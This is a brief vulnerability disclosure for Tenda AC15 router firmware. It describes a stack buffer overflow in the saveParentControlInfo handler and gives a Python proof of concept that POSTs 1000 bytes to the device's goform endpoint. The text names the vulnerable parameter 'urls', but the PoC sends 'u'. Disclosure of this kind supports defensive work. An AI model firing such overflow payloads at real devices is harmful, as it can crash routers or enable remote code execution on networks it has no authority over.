## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The function `saveParentControlInfo` contains a stack-based buffer overflow vulnerability.

![image-20240316165918271](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316165918271.png)

it reads in a user-provided parameter `urls`, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer.

![image-20240316180358563](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316180358563.png)

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

![image-20240316170554480](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316170554480.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000

data = {"u": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314171654837](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314171654837.png)
